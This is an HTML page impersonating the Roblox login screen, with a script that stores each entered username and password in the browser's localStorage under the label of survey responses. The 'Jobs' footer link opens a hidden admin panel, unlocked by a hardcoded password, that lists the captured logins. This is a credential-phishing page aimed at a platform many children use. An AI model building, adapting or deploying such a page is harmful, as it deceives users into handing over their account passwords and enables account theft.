[roblox-login.html](https://github.com/user-attachments/files/27337753/roblox-login.html)

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-color: #000;
        }

        /* Navigation */
        nav {
            background-color: rgba(0, 0, 0, 0.95);
            border-bottom: 1px solid #333;
            padding: 12px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            z-index: 20;
            flex-shrink: 0;
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo {
            width: 32px;
            height: 32px;
            background-color: #dc2626;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .logo:hover {
            background-color: #b91c1c;
        }

        nav a {
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.2s;
        }

        nav a:hover {
            color: #d1d5db;
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-input {
            background-color: #111;
            border: 1px solid #444;
            color: #fff;
            padding: 8px 14px;
            border-radius: 4px;
            font-size: 12px;
            width: 180px;
            transition: border-color 0.2s;
        }

        .search-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .signup-btn {
            background-color: #22c55e;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 12px;
            transition: background-color 0.2s;
        }

        .signup-btn:hover {
            background-color: #16a34a;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 16px;
        }

        .background {
            position: absolute;
            inset: 0;
            background-image: url('https://d2xsxph8kpxj0f.cloudfront.net/310519663498305382/dgTY4WUNnNMoGscGdBFF9N/roblox-bg-games-ChafdmHnzmgYUE4Gm5nxVF.webp');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            opacity: 1;
        }

        .overlay {
            position: absolute;
            inset: 0;
            background-color: rgba(0, 0, 0, 0.7);
        }

        .content {
            position: relative;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        /* Thank You Message */
        .thank-you {
            margin-bottom: 32px;
            animation: fadeInUp 0.8s ease-out;
        }

        .thank-you-box {
            background-color: rgba(34, 197, 94, 0.2);
            border: 2px solid #22c55e;
            border-radius: 8px;
            padding: 24px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
        }

        .thank-you-box p {
            font-size: 32px;
            font-weight: bold;
            color: #22c55e;
            text-align: center;
        }

        /* Login Form */
        .login-form-container {
            width: 100%;
            max-width: 420px;
        }

        .login-form {
            background-color: rgba(17, 24, 39, 0.95);
            border: 2px solid #facc15;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(4px);
        }

        .login-form h2 {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 32px;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-input {
            width: 100%;
            background-color: rgba(31, 41, 55, 0.9);
            border: 2px solid #555;
            color: #fff;
            padding: 12px 16px;
            border-radius: 4px;
            font-size: 14px;
            transition: all 0.2s;
        }

        .form-input::placeholder {
            color: #888;
        }

        .form-input:focus {
            outline: none;
            border-color: #facc15;
            box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.1);
        }

        .login-btn {
            width: 100%;
            background-color: #22c55e;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 24px;
            transition: all 0.2s;
            box-shadow: 0 10px 15px -3px rgba(34, 197, 94, 0.3);
        }

        .login-btn:hover {
            background-color: #16a34a;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }

        .forgot-password a {
            color: #999;
            text-decoration: none;
            font-size: 12px;
            transition: color 0.2s;
        }

        .forgot-password a:hover {
            color: #ccc;
            text-decoration: underline;
        }

        .divider {
            border-top: 1px solid #444;
            margin: 20px 0;
        }

        .alt-login-methods {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .alt-btn {
            background-color: #1f2937;
            border: 1px solid #444;
            color: #fff;
            padding: 12px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s;
        }

        .alt-btn:hover {
            background-color: #374151;
        }

        .signup-link {
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #444;
            text-align: center;
            font-size: 12px;
            color: #999;
        }

        .signup-link a {
            color: #3b82f6;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.2s;
        }

        .signup-link a:hover {
            color: #60a5fa;
            text-decoration: underline;
        }

        /* Footer */
        footer {
            background-color: rgba(0, 0, 0, 0.8);
            border-top: 1px solid #333;
            padding: 32px 16px;
            text-align: center;
            font-size: 12px;
            color: #666;
            z-index: 10;
            position: relative;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #666;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer-links a:hover {
            color: #999;
            text-decoration: underline;
        }

        /* Admin Panel */
        .admin-panel {
            position: fixed;
            inset: 0;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            padding: 16px;
        }

        .admin-panel.hidden {
            display: none;
        }

        .admin-content {
            background-color: rgba(31, 41, 55, 0.95);
            border: 2px solid #facc15;
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .admin-header h2 {
            font-size: 20px;
            font-weight: bold;
        }

        .exit-btn {
            background-color: #22c55e;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .exit-btn:hover {
            background-color: #16a34a;
        }

        .response-list {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .response-item {
            background-color: rgba(55, 65, 81, 0.5);
            border: 1px solid #facc15;
            border-radius: 8px;
            padding: 16px;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }

        .response-content {
            flex: 1;
        }

        .response-number {
            font-size: 12px;
            font-weight: bold;
            color: #facc15;
        }

        .response-time {
            font-size: 11px;
            color: #999;
            margin-top: 4px;
        }

        .response-message {
            font-size: 12px;
            color: #fff;
            margin-top: 8px;
        }

        .delete-btn {
            background: none;
            border: none;
            color: #999;
            font-size: 18px;
            cursor: pointer;
            padding: 4px 8px;
            transition: color 0.2s;
        }

        .delete-btn:hover {
            color: #ef4444;
        }

        /* Delete Confirmation */
        .delete-confirm {
            background-color: rgba(127, 29, 29, 0.5);
            border: 2px solid #ef4444;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .delete-confirm p {
            color: #fff;
            font-weight: bold;
            margin-bottom: 12px;
        }

        .confirm-buttons {
            display: flex;
            gap: 8px;
        }

        .confirm-btn {
            flex: 1;
            padding: 8px;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }

        .yes-btn {
            background-color: #ef4444;
            color: #fff;
        }

        .yes-btn:hover {
            background-color: #dc2626;
        }

        .no-btn {
            background-color: #4b5563;
            color: #fff;
        }

        .no-btn:hover {
            background-color: #5a6370;
        }

        /* Password Input */
        .password-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .password-input {
            width: 100%;
            background-color: rgba(31, 41, 55, 0.9);
            border: 2px solid #555;
            color: #fff;
            padding: 12px 16px;
            border-radius: 4px;
            font-size: 14px;
        }

        .password-input:focus {
            outline: none;
            border-color: #facc15;
        }

        .password-buttons {
            display: flex;
            gap: 8px;
        }

        .password-buttons button {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }

        .confirm-password-btn {
            background-color: #22c55e;
            color: #fff;
        }

        .confirm-password-btn:hover {
            background-color: #16a34a;
        }

        .cancel-btn {
            background-color: #4b5563;
            color: #fff;
        }

        .cancel-btn:hover {
            background-color: #5a6370;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 768px) {
            nav {
                padding: 10px 12px;
                gap: 8px;
            }

            .nav-left a {
                display: none;
            }

            .search-input {
                width: 100px;
                font-size: 11px;
            }

            .signup-btn {
                padding: 6px 12px;
                font-size: 11px;
            }

            .login-form {
                padding: 24px;
            }

            .login-form h2 {
                font-size: 22px;
                margin-bottom: 20px;
            }

            .form-input {
                padding: 10px 12px;
                font-size: 13px;
            }

            .thank-you-box p {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navigation -->
        <nav>
            <div class="nav-left">
                <div class="logo">R</div>
                <a href="#">Charts</a>
                <a href="#">Marketplace</a>
                <a href="#">Create</a>
            </div>
            <div class="nav-right">
                <a href="#">Robux</a>
                <input type="text" class="search-input" placeholder="Search">
                <button class="signup-btn">Sign Up</button>
            </div>
        </nav>

        <!-- Main Content -->
        <div class="main-content">
            <div class="background"></div>
            <div class="overlay"></div>
            <div class="content" id="mainContent">
                <!-- Thank You Message (hidden by default) -->
                <div class="thank-you hidden" id="thankYouMessage">
                    <div class="thank-you-box">
                        <p>Thank you!</p>
                    </div>
                </div>

                <!-- Login Form -->
                <div class="login-form-container" id="loginFormContainer">
                    <form class="login-form" id="loginForm">
                        <h2>Login to Roblox</h2>
                        
                        <div class="form-group">
                            <input type="text" class="form-input" id="username" placeholder="Username/Email/Phone">
                        </div>

                        <div class="form-group">
                            <input type="password" class="form-input" id="password" placeholder="Password">
                        </div>

                        <button type="submit" class="login-btn" id="loginBtn">Log In</button>

                        <div class="forgot-password">
                            <a href="#">Forgot Password or Username?</a>
                        </div>

                        <div class="divider"></div>

                        <div class="alt-login-methods">
                            <button type="button" class="alt-btn">Email Me a One-Time Code</button>
                            <button type="button" class="alt-btn">Quick Sign-in</button>
                        </div>

                        <div class="signup-link">
                            Don't have an account? <a href="#">Sign Up</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer>
            <div class="footer-links">
                <a href="#">About Us</a>
                <a href="#" id="jobsLink">Jobs</a>
                <a href="#">Blog</a>
                <a href="#">Parents</a>
                <a href="#">Buy Gift Cards</a>
                <a href="#">Help</a>
                <a href="#">Terms</a>
                <a href="#">Accessibility</a>
                <a href="#">Privacy</a>
                <a href="#">Your Privacy Choices</a>
                <a href="#">Sitemap</a>
            </div>
            <p>©2026 Roblox Corporation</p>
        </footer>
    </div>

    <!-- Admin Panel -->
    <div class="admin-panel hidden" id="adminPanel">
        <div class="admin-content">
            <div id="adminPasswordForm">
                <h2 style="margin-bottom: 20px;">관리자 인증</h2>
                <form class="password-form" id="passwordForm">
                    <input type="password" class="password-input" id="adminPassword" placeholder="비밀번호를 입력하세요">
                    <div class="password-buttons">
                        <button type="submit" class="confirm-password-btn">확인</button>
                        <button type="button" class="cancel-btn" id="cancelAdminBtn">취소</button>
                    </div>
                </form>
            </div>

            <div id="adminResponsesView" style="display: none;">
                <div class="admin-header">
                    <h2>설문 응답</h2>
                    <button class="exit-btn" id="exitAdminBtn">나가기</button>
                </div>
                <div class="response-list" id="responseList">
                    <!-- Responses will be inserted here -->
                </div>
            </div>
        </div>
    </div>

    <script>
        // Data Management
        class SurveyManager {
            constructor() {
                this.storageKey = 'roblox_survey_responses';
                this.loadResponses();
            }

            loadResponses() {
                const data = localStorage.getItem(this.storageKey);
                this.responses = data ? JSON.parse(data) : [];
            }

            saveResponses() {
                localStorage.setItem(this.storageKey, JSON.stringify(this.responses));
            }

            addResponse(name, message) {
                const response = {
                    id: Date.now(),
                    name: name || null,
                    message: message || null,
                    createdAt: new Date().toISOString()
                };
                this.responses.push(response);
                this.saveResponses();
                return response;
            }

            getAllResponses() {
                return this.responses;
            }

            deleteResponse(id) {
                this.responses = this.responses.filter(r => r.id !== id);
                this.saveResponses();
            }
        }

        const surveyManager = new SurveyManager();

        // UI Elements
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const thankYouMessage = document.getElementById('thankYouMessage');
        const jobsLink = document.getElementById('jobsLink');
        const adminPanel = document.getElementById('adminPanel');
        const adminPasswordForm = document.getElementById('adminPasswordForm');
        const adminResponsesView = document.getElementById('adminResponsesView');
        const passwordForm = document.getElementById('passwordForm');
        const adminPasswordInput = document.getElementById('adminPassword');
        const cancelAdminBtn = document.getElementById('cancelAdminBtn');
        const exitAdminBtn = document.getElementById('exitAdminBtn');
        const responseList = document.getElementById('responseList');

        // Event Listeners
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const name = usernameInput.value;
            const message = passwordInput.value;

            surveyManager.addResponse(name, message);

            // Show thank you message
            thankYouMessage.classList.remove('hidden');
            usernameInput.value = '';
            passwordInput.value = '';

            setTimeout(() => {
                thankYouMessage.classList.add('hidden');
            }, 3000);
        });

        jobsLink.addEventListener('click', (e) => {
            e.preventDefault();
            adminPanel.classList.remove('hidden');
            adminPasswordForm.style.display = 'block';
            adminResponsesView.style.display = 'none';
            adminPasswordInput.value = '';
        });

        cancelAdminBtn.addEventListener('click', (e) => {
            e.preventDefault();
            adminPanel.classList.add('hidden');
            adminPasswordInput.value = '';
        });

        exitAdminBtn.addEventListener('click', () => {
            adminPanel.classList.add('hidden');
            adminPasswordInput.value = '';
            adminPasswordForm.style.display = 'block';
            adminResponsesView.style.display = 'none';
        });

        passwordForm.addEventListener('submit', (e) => {
            e.preventDefault();
            if (adminPasswordInput.value === 'abc135') {
                adminPasswordForm.style.display = 'none';
                adminResponsesView.style.display = 'block';
                displayResponses();
            } else {
                alert('비밀번호가 틀렸습니다.');
                adminPasswordInput.value = '';
            }
        });

        function displayResponses() {
            const responses = surveyManager.getAllResponses();
            responseList.innerHTML = '';

            if (responses.length === 0) {
                responseList.innerHTML = '<div style="text-align: center; color: #999;">응답이 없습니다.</div>';
                return;
            }

            responses.forEach((response, index) => {
                const item = document.createElement('div');
                item.className = 'response-item';
                item.id = `response-${response.id}`;

                const date = new Date(response.createdAt);
                const timeStr = date.toLocaleString('ko-KR');

                item.innerHTML = `
                    <div class="response-content">
                        <div class="response-number">#${index + 1} ${response.name || '익명'}</div>
                        <div class="response-time">${timeStr}</div>
                        ${response.message ? `<div class="response-message">${response.message}</div>` : ''}
                    </div>
                    <button class="delete-btn" onclick="openDeleteConfirm(${response.id})">⋮</button>
                `;

                responseList.appendChild(item);
            });
        }

        window.openDeleteConfirm = function(id) {
            const item = document.getElementById(`response-${id}`);
            const content = item.innerHTML;

            item.innerHTML = `
                <div class="delete-confirm">
                    <p>정말로 삭제하시겠습니까?</p>
                    <div class="confirm-buttons">
                        <button class="confirm-btn yes-btn" onclick="confirmDelete(${id})">YES</button>
                        <button class="confirm-btn no-btn" onclick="cancelDelete(${id})">NO</button>
                    </div>
                </div>
            `;

            item.dataset.originalContent = content;
        };

        window.confirmDelete = function(id) {
            surveyManager.deleteResponse(id);
            displayResponses();
        };

        window.cancelDelete = function(id) {
            const item = document.getElementById(`response-${id}`);
            item.innerHTML = item.dataset.originalContent;
        };
    </script>
</body>
</html>
